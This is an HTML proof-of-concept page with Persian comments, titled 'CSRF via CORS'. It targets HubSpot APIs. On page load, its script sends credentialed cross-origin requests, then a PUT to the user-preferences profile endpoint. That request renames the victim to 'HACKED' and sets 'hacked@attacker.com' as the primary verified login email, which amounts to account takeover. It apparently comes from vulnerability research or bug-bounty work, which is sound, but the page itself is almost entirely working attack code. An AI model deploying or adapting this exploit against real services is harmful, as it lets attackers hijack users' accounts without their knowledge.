<!DOCTYPE html>
<html>
<head>
    <title>CSRF via CORS</title>
</head>
<body>
    <script>
    // مرحله ۱: درخواست به API که CORS داره (برای فعال کردن کوکی‌ها)
    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
        method: 'POST',
        credentials: 'include',  // این کوکی‌ها رو همراه می‌فرسته
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://zeynaal.github.io'
        },
        body: JSON.stringify([{
            event: 'page_view',
            properties: {
                url: window.location.href,
                timestamp: new Date().toISOString()
            }
        }])
    })
    .then(response => {
        console.log('[+] CORS request sent! Status:', response.status);
        return response.text();
    })
    .then(data => {
        console.log('[+] CORS response:', data);
        
        // مرحله ۲: حالا که کوکی‌ها فعال شدن، درخواست CSRF رو بفرست
        var xhr = new XMLHttpRequest();
        xhr.open("PUT", "https://app-na2.hubspot.com/api/userpreferences/v1/profile?clienttimeout=14000&hs_static_app=UserPreferencesUI&hs_static_app_version=1.29750", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.withCredentials = true;  // کوکی‌ها همراه این درخواست میرن
        
        var body = JSON.stringify({
            firstName: "HACKED",
            hasEditEmail: true,
            emailAddress: "hacked@attacker.com",
            emailHash: "ffb9a42270d734c77d8d47f8d8e647a1",
            pendingEmailAddress: null,
            loginEmails: [{
                emailId: 230088727,
                userId: 96397150,
                emailAddress: "hacked@attacker.com",
                localPart: "hacked",
                domain: "attacker.com",
                primary: true,
                verified: true,
                verificationSource: "SIGNUP",
                updatedAt: 1785424761874
            }],
            canSelfDelete: true,
            scim: false
        });
        
        xhr.send(body);
        console.log('[+] CSRF request sent!');
    })
    .catch(error => {
        console.log('[-] Error:', error);
    });
    </script>
</body>
</html>
